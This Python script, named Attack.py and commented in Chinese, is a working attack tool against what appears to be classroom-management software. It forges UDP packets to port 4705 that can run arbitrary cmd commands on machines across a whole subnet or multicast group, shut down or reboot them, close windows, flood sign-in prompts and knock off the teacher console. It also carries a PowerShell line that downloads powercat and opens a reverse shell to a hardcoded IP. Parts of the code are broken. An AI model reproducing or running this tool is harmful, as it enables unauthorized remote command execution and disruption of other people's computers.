#! /usr/bin/env python
import socket
import struct
import random
import sys
import os
import getopt
import time
import threading
#计算校验和
def checksum(data):
    s = 0
    n = len(data) % 2
    for i in range(0, len(data)-n, 2):
        s+=  (data[i]) + ((data[i+1]) << 8)
    if n:
        s+= (data[i+1])
    while (s >> 16):
        s = (s & 0xFFFF) + (s >> 16)
    s = ~s & 0xffff
    return s
#将数据包原始数据转换为list对象
def format16(str):
      l = []
      for i in range(len(str)):
        if i % 2 ==0:
          q = int('0x' + (str[i:i+2]),16)
          l.append(q)
      return l
class UDP(object):
    def __init__(self, source,destination,sport,dport,data=''):
        super(UDP, self).__init__()
        self.source = source             # 源地址
        self.destination = destination   # 目的地址
        self.data = data                 # 数据段
        self.sport =sport                # arbitrary source port
        self.dport = dport               # arbitrary destination port
        self.length = 8+len(data);       # UDP 头部长度
        self.checksum =0                 #检验和


    def create_udp_header(self,proto=socket.IPPROTO_UDP):
        n=0
        pseudo_header = struct.pack('!4s4sBBH',
                                    socket.inet_aton(self.source), socket.inet_aton(self.destination), 0,
                                    proto, self.length)
        self.checksum = checksum(pseudo_header)
        udp_header = struct.pack('!HHHH', self.sport, self.dport, self.length, self.checksum)
        return packet
           
    def send(self): 
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
        except Exception as e:
            raise e
        data = bytes(self.data)
        udp_header = struct.pack('!HHHH', self.sport, self.dport, self.length, self.checksum)
        packet = udp_header+data
        s.sendto(packet, (self.destination, self.dport));
        s.close()
        print('UDP Send Successful!')



class Data(object):
    """
    构造payload数据段
    参数说明:
        data:要发送的文本
        effect:要执行的功能 
                选项:
                cmd(可执行命令) 
                msg(文本消息) 
                caw(关闭所有程序)
                ctw(关闭置顶的程序)
                kill(挤下教师端)
                sih (发送签到包)
        nocmd:是否不执行data文本 不执行:1 执行:其他
        onlyhead:是否只发送头数据 是:1 否 0
    """
    def __init__(self, data='',mydata='',effect='',nocmd=0,onlyhead=0):
        super(Data, self).__init__()
        self.data = data            # 要发送的文本数据
        self.effect = effect        #要启用的功能
        self.nocmd = nocmd          #是否不执行data文本
        self.onlyhead =onlyhead           #是否只发送头数据
        self.mydata = format16(mydata)
        #发送消息
        self.header_msg = format16('444d4f43000001009e0300001041affba0e7524091dc27a3b6f9292e204e0000c0a850819103000091030000000800000000000005000000')
        #执行命令
        self.header_cmd = format16('444d4f43000001006e030000aa9218a2aa809246b7d5ad545b998dc6204e0000c0a81f0b610300006103000000020000000000000f0000000100000043003a005c00570049004e0044004f00570053005c00730079007300740065006d00330032005c0063006d0064002e00650078006500000000000000')
        #关闭所有窗口
        self.header_close_all_windows = format16('444d4f43000001002a0200003dd66ec35ae75ac81b8bad50c5b0ca73204e0000c0a8019b1d0200001d0200000002000000000000020000100f00000001000000000000005965085e065c7351ed95a8608476945e28750b7a8f5e000000000000')
        #关闭所有窗口 计时
        self.header_close_all_windows_time = format16('444d4f43000001002a02000088b3b065b0be56f920decdd2d8823e35204e0000c0a8019b1d0200001d0200000002000000000000020000000500000001000000')
        #关闭顶端窗口
        self.header_close_top_windows = format16('444d4f43000001006e0300004e1e91f07b48f68a3cda55563075967a204e0000c0a8019b610300006103000000020000000000000e0000000000000001000000e102020ba615e102020ca9150100112b0000100001000000010000005e010000000000000200000000500000a005000001000000190000004b00000000000000c0a8019b040000000c00000010000000000000002003e001')
        #签到骚扰
        self.header_sign_in_harassment = format16('444d4f430000010026000000e9a680e905af21c1fb06301637bb65ab204e0000c0a8019b190000001900000000020000000000001b00000001000000030000000000')
        #挤掉教师端
        self.header_teacher_closeradio_broadcast = format16('414e4e4f01000000010000000000000000000000c0a81f0b08320b040000000008320b0401000000fcf6b0af286d120018320b045440120050401200c46012000200000000000000')
    def pack(self):
        data = self.pkg_data(self.data)
        payload = struct.pack("%dB" % (len(data)), *data)
        #print_hex(payload)
        return payload
    # 4字节格式化要发送的消息
    def format_4byte_send(self,content):
        arr = []
        for ch in content:
            tmp = ''.join(list(map(lambda x: hex(ord(x)), ch)))
            if int(tmp, 16) > 0xff:
                tmp = tmp[2:]
                high = int((tmp[0] + tmp[1]), 16)
                low = int((tmp[2] + tmp[3]), 16)
                arr.append(low)
                arr.append(high)
            else:
                high = 0
                low = int((tmp[2] + tmp[3]), 16)
                arr.append(low)
                arr.append(high)
        return arr



    # 将要发送的消息打包成完整的指令
    def pkg_data(self, content):
        cmdd = {
            "cmd":self.header_cmd,
            "caw":self.header_close_all_windows,
            "ctw":self.header_close_top_windows,
            "msg":self.header_msg,
            "":self.header_msg,
            "sih":self.header_sign_in_harassment,
            "kill":self.header_teacher_closeradio_broadcast,
            "mydata":self.mydata
            }
        #get header
        data_header = cmdd[self.effect]
        #create_header_Tag
        if len(data_header)<28:
            data_header = data_header+ [(0x00) for i in range(28-len(data_header))]
        for i in range(16):
            data_header[12+i]=int(random.randint(0,255))
        #onlyhead:是否只发送头数据 是:1 否 0
        if self.onlyhead==1:
            return data_header
        #get header_data    
        data_data = self.format_4byte_send(self.data)
        #fill data_header to 572 bytes
        #nocmd:是否不执行data文本 不执行:1 执行:其他
        if self.nocmd ==1:
            header_fill =[]
        else:
            header_fill = [(0x00) for i in range(572-len(data_header))]

        data_fill = [(0x00) for i in range(1440-len(data_header)-len(header_fill)-len(data_data))]
        data = data_header + header_fill + data_data +data_fill
        
        return data

class CLI(object):
    def __init__(self):
        super(CLI,self).__init__()

    def printUsage(self):
        print ('''
            usage: 
            Attack.py -i <ip> -p <port> -m <message> -c <command> -r -s -k -t -l -h
             
            Attack.py --ip <ip> --port <port> --message <message> --command <command> 
                    --reboot --shutdown --kill --time --loop --help --caw --ctw --sih 
                    --echo --sip --sport --mydata
           --------------------------------------------------------------
           -i[ip]:                      目标IP地址,形如 224.50.50.42 或
                                        172.25.10.1-255 或 172.25.10.1/24
                                         这样的单个/多个ip或整个网段。  
                                         注：224.50.50.42是组播地址，可用
                                         于全频道攻击。
           -p[port]:                     接收方端口,默认4705。
           -m[message]:                  要发送的消息。
           -c[command]:                  要执行的cmd命令。
           -r[reboot]:                   重启目标机器。
           -s[shutdown]:                 关闭目标机器。
           -k[kill]:                     挤下教师端。    
                                         注:教师端会提示,断腿操作!慎!!!!
           -t[time]:                     设置循环执行的时间间隔,默认为5秒
           -l[loop]:                     设置循环次数,默认为1次
           --caw[close_all_windows]:     关闭目标所有程序
           --ctw[close_top_windows]:     关闭目标顶端窗口
           --sih[sign_in_harassment]:    签到骚扰
           -h[help]:                     帮助菜单。
           --sip[source_ip]:             发包的ip,没啥用,Windows XP 后已经
                                         禁止更改发包ip了
           --sport:                      发包端口,默认随机 
           --echo:                       开启回显,默认关闭
           --mydata:                     独立选项,发送16进制原始数据.此项与
                                         其他功能选项互斥(不包括ip,port,
                                         sip,sport,echo,loop,time)
           **************************************************************\n
           例:
           Attack.py -i 224.50.50.42-224 -m "Test" 
           Attack.py -i 224.50.50.42/24 -m "Test" -t 3 -l 5
           Attack.py -i 224.50.50.42 -c "for /l %i in (1,1,10) do (@pause)"
           Attack.py -i 224.50.50.42 -k
           Attack.py -i 224.50.50.42 --sih -t 1 -l 200 --echo -m "Ha Ha Ha"
           --------------------------------------------------------------\n
           ''')
        print("----------------------------------------------------------------")
        print("|%-62s|"%("your IP:"+socket.gethostbyname(socket.gethostname())))
        print("----------------------------------------------------------------")
     
    def main(self):
        if len(sys.argv)< 2 :
            self.printUsage()
            sys.exit(-1)
        config ={
        "ip" : "",
        "port" : 4705,
        "message" : "",
        "command" : "",
        "time":0,
        "loop":1,
        "reboot":0,
        "shutdown":0,
        "kill":0,
        "caw":0,
        "ctw":0,
        "sih":0,
        "echo":0,
        "sip":"224.50.50.42",
        "sport":random.randint(1, 65535),
        "shell":"" ,#cc: cmd to cmd cp: cmd to powershell
        "mydata":""
        }
        try:
            opts, args = getopt.getopt(sys.argv[1:],"i:p:m:c:t:l:rskh",["ip=","port=","message=","command=","time=","loop=","reboot","shutdown","kill","help","caw","ctw","sih","echo","sip=","sport=","mydata=","nc"])
        except getopt.GetoptError:
            print("参数错误!"+"sys.argv:"+str(sys.argv))
            self.printUsage()
            sys.exit(-1)
        for opt,arg in opts:
            if opt in ("-i", "--ip"):
                config["ip"] =arg

            elif opt in ("-p","--port"):
                config["port"] =int(arg)

            elif opt in ("-m","--message"):
                config["message"] =arg

            elif opt in ("-c","--command"):
                config["command"] =arg

            elif opt in ("-t","--time"):
                config["time"] =float(arg)

            elif opt in ("-l","--loop"):
                config["loop"] =int(arg)

            elif opt in ("-r","--reboot"):
                config["reboot"] =1

            elif opt in ("-s","--shutdown"):
                config["shutdown"] =1

            elif opt in ("-k","--kill"):
                config["kill"] =1

            elif opt in "--caw":
                config["caw"] =1

            elif opt in "--ctw":
                config["ctw"] =1

            elif opt in "--sih":
                config["sih"] =1

            elif opt in "--getip":
                print('|%-62s|'%(os.popen(r'ifconfig |findstr IPv4').read()))

            elif opt in "--stop":
                popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=allow')

            elif opt in "--start":
                popen('sc config MpsSvc start= auto')
                popen('net start MpsSvc')
                popen('netsh advfirewall set allprofiles state on')
                popen('netsh advfirewall firewall set rule name="StudentMain.exe" new action=block')

            elif opt in "--echo":
                config["echo"] =1

            elif opt in "--sip":
                config["sip"] =arg

            elif opt in "--shell":
                config["shell"] =arg

            elif opt in "--sport":
                config["sport"] =int(arg)

            elif opt in "--mydata":
                config["mydata"] =arg

            elif opt in "--nc":
                th = threading.Thread(target=get_nc)
                th.start()

            elif opt in("-h","--help"):
                self.printUsage()

        if config["echo"] ==1 : 
            print("----------------------------------------------------------------")
            for i in config:
                print("|    %-16s    :    %-24s         |"%(i,str(config[i])))
                #print('|'+i+': ' + str(config[i]))
            print("----------------------------------------------------------------")
            print("|%-62s|"%("Other:"+",".join(args)))
            print("|%-58s|"%("攻击ip列表:" + str(self.get_iplist(config["ip"]))))
            print("----------------------------------------------------------------")
        self.send(config)
    def get_nc():
        payload=r"powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -c 192.168.1.4 -p 9999 -e cmd"
        pa = r"echo 151.101.76.133 raw.githubusercontent.com >> C:/Windows/System32/drivers/etc/hosts"
        pad = Data.Data(data=r"/c "+pa,effect="cmd",nocmd=0,onlyhead=0).pack()
        try:
            ti.UDP(config["sip"],ip,config["sport"],config["port"],pad).send
        except Exception as e:
            print(e)

        nc = Data.Data(data=r"/c "+payload,effect="cmd",nocmd=0,onlyhead=0).pack()
        try:
            print("[-------------]")
            ti.UDP(config["sip"],ip,config["sport"],config["port"],nc).send
        except Exception as e:
            print("nc连接失败，原因：",end="")
            print(e)
        else:
            print("尝试后台监听")
            #os.system(r"echo 151.101.76.133 raw.githubusercontent.com >> C:/Windows/System32/drivers/etc/hosts")
            os.system(r"powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'); powercat -l -p 9999")

        #根据给出的ip/ip段构建ip列表
    def get_iplist(self,ip):
        ip_list = []

        if ip.partition(r'/')[1] =='/':
            ip = ip.partition(r'/')
           # print("以%s位子网掩码构造ip列表"%(ip[2]))
        elif ip.partition(r'-')[1] =='-':
            ip = ip.partition(r'-') 
           # print("以范围%s - %s 构造ip列表"%(ip[0].rpartition(r'.')[2],ip[2]))
        
        #print("正以%12s为原型在构造ip列表"%(str(ip)))

        if len(ip) > 0:
            if  ip[1] == '/':
                if  int(ip[2])< 33  and int(ip[2]) > 0:
                    bgn = int(ip[0].rpartition(r'.')[2])
                    end = pow(2,(32-int(ip[2])))+1
                    for j in range(bgn,bgn+end):
                        if j < 256:
                            ip_list.append(ip[0].rpartition(r'.')[0]+'.'+str(j))
            elif  ip[1]== '-':
                for i in range(int(ip[0].rpartition(r'.')[2]),int(ip[2])+1):
                    if i < 256:
                        ip_list.append(ip[0].rpartition(r'.')[0]+'.'+str(i))
            else :
                try:
                    socket.inet_aton(ip)
                except socket.error:
                    print('不符合规则的ip,请重试')
                    return
                else:
                    ip_list.append(ip)
        return ip_list

    def send(self,config):
        for count in range(int(config["loop"])):
            for ip in self.get_iplist(config["ip"]):
                if config["echo"] ==1:
                        print("----------------------------------------------------------------")
                        print("|正在对ip为 %-16s 的设备进行发包!                   |"%(ip))
                        print("----------------------------------------------------------------")
                #消息数据包
                payload_message = Data(data=config["message"],effect="msg",nocmd=1,onlyhead=0).pack()
                #命令数据包
                payload_command = Data(data= r"/c "+ config["command"],effect="cmd",nocmd=0,onlyhead=0).pack()
                #关闭所有程序数据包
                payload_caw = Data(data="",effect="caw",nocmd=0,onlyhead=0).pack()
                #关闭置顶程序数据包
                payload_ctw = Data(data="",effect="ctw",nocmd=0,onlyhead=0).pack()
                #挤下教师端数据包
                payload_kill = Data(data="",effect="kill",nocmd=0,onlyhead=1).pack()
                #发送签到数据包
                payload_sih = Data(data="",effect="sih",nocmd=0,onlyhead=0).pack()
                #关机数据包
                payload_shutdown = Data(data=r"/c shutdown /p",effect="cmd",nocmd=0,onlyhead=0).pack()
                #重启数据包
                payload_reboot = Data(data=r"/c shutdown /r /t 0",effect="cmd",nocmd=0,onlyhead=0).pack()
                #发送原始数据表
                payload_mydata = Data(mydata=config["mydata"],effect="mydata",nocmd=1,onlyhead=1).pack()
                run = {
                "caw":payload_caw,
                "ctw":payload_ctw,
                "kill":payload_kill,
                "sih":payload_sih,
                "shutdown":payload_shutdown,
                "reboot":payload_reboot,
                }

                if config["echo"] ==1:
                    print("----------------------------------------------------------------")
                for choice in run:
                    if config[choice]!=0:
                        try:
                            UDP(config["sip"],ip,config["sport"],config[
                            "port"],run[choice]).send()
                        except Exception as e:
                            print(e)
                        else:
                            if config["echo"]==1:
                                print("|Running %-16s  :%-16s  is Send Success! |"%(str(choice),str(config[choice])))



                if config["message"]!='':
                    try:
                        UDP(config["sip"],ip,config["sport"],config[
                            "port"],payload_message).send()
                    except Exception as e:
                        print(e)
                    else:
                        if config["echo"]==1:
                            print("|Running %-16s  :%-16s  is Send Success! |"%("Message",config["message"]))
                if config["mydata"]!='':
                    try:
                        UDP(config["sip"],ip,config["sport"],config[
                            "port"],payload_mydata).send()
                    except Exception as e:
                        print(e)
                    else:
                        if config["echo"]==1:
                            print("|Running %-16s  :%-16s  is Send Success! |"%("Mydata",config["mydata"]))

                if config["command"]!=r'/c ':
                    try:
                        UDP(config["sip"],ip,config["sport"],config[
                            "port"],payload_command).send()
                    except Exception as e:
                        print(e)
                    else:
                        if config["echo"]==1:
                            print("|Running %-16s  :%-16s  is Send Success! |"%("command",config["command"]))
                    if config["echo"] ==1:
                        print("----------------------------------------------------------------")
            
            if config["echo"]==1:
                print("----------------------------------------------------------------")
                print("|已执行完 %-16s次! 休眠%-16s秒后继续执行!|"%(str(count+1),str(config["time"])))
                print("----------------------------------------------------------------")
            time.sleep(config["time"])
        print("----------------------------------------------------------------")
        print("|%-56s|"%("任务执行完成!"))
        print("----------------------------------------------------------------")                     



if __name__ == '__main__':

    # source_ip = "10.0.0.1"
    # destination_ip = "6.6.6.6"
    # source_prot =random.randint(1, 65535)
    # destination_port = 6666

    # try:
    #     UDP(source_ip,destination_ip,source_prot,destination_port,"This is TCP Data".encode()).send() 
    # except Exception as e:
    #     print(e)
    # else:
    #     print("UDP数据发送成功")
    
    # source_ip = "10.0.0.1"
    # destination_ip = "225.2.2.1"
    # #destination_ip = "192.168.31.110"
    # source_prot =random.randint(1, 65535)
    # destination_port = 5512
    # #destination_port = 4705
    # data = '/c for /l %i in (1,1,10) do (@pause)'
    # payload = Data(data=data,effect='cmd',nocmd=0,onlyhead=0).pack()

    # try:
    #     UDP(source_ip,destination_ip,source_prot,destination_port,payload).send() 
    # except Exception as e:
    #     print(e)
    cli = CLI()
    cli.main()

    # payload_command = Data(data= r"/c "+ 'cmd',effect="cmd",nocmd=0,onlyhead=0).pack()
    # try:
    #     UDP('10.10.85.10','10.10.85.16',1032,4705,payload_command).send()
    # except Exception as e:
    #     print(e)
